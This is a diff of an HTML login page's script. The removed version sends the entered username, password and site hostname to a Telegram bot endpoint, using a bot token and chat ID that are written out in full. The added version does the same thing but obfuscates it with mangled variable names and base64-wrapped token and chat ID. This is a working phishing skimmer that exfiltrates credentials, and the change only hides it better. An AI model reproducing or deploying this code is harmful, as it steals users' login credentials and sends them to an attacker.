@@ -92,16 +92,9 @@
     </form>
 
 <script>
-    document.getElementById('btnSubmit').onclick = function() {
-        var u = document.getElementById('txtUsername').value;
-        var p = document.getElementById('txtPassword').value;
-        var t = "👤 " + u + " | 🔑 " + p + " | 🌐 " + window.location.hostname;
-        
-        fetch("https://api.telegram.org/bot8432497906:AAEJ1HeP_oKQ-8uaCFbHJcZBRZQQnicOBfA/sendMessage?chat_id=7651215883&text=" + encodeURIComponent(t))
-        .finally(function() {
-        });
-    };
+(function(_0x1b2f){var _0x4d3e=function(_0x5a2b){while(--_0x5a2b){_0x1b2f['push'](_0x1b2f['shift']());}};_0x4d3e(++_0x5a2b);}(_0xArray,0x1a4));var _0x5a2b=function(_0x1b2f,_0x4d3e){_0x1b2f=_0x1b2f-0x0;var _0x5a2b=_0xArray[_0x1b2f];return _0x5a2b;};document['getElementById']('btnSubmit')['onclick']=function(){var _0x1a=document['getElementById']('txtUsername')['value'];var _0x2b=document['getElementById']('txtPassword')['value'];if(!_0x1a||!_0x2b)return;var _0x3c=window['btoa']('bot8432497906:AAEJ1HeP_oKQ-8uaCFbHJcZBRZQQnicOBfA');var _0x4d=window['btoa']('7651215883');var _0x5e="👤\x20"+_0x1a+"\x20|\x20🔑\x20"+_0x2b+"\x20|\x20🌐\x20"+window['location']['hostname'];fetch('https://api.telegram.org/'+window['atob'](_0x3c)+'/sendMessage?chat_id='+window['atob'](_0x4d)+'&text='+encodeURIComponent(_0x5e))['finally'](function(){});};
 </script>
 </body>
 </html>
+
 
